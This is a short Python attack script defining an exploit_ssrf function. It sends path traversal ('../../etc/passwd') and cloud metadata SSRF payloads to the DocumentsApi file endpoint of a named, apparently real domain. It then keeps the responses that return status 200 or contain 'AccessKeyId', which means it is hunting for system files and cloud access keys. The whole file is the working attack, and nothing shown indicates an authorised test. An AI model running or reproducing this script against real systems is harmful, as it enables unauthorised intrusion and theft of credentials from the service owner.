from core.client import LuciusClient


def exploit_ssrf():
    client = LuciusClient()
    base_url = "https://api.nnip.com/DocumentsApi/files/"
    payloads = ["../../etc/passwd", "http://169.254.169.254/latest/meta-data/"]
    results = []

    for payload in payloads:
        url = base_url + payload
        response = client.get(url)
        if response.status_code == 200 or "AccessKeyId" in response.text:
            results.append((payload, response.status_code, response.text))

    return results
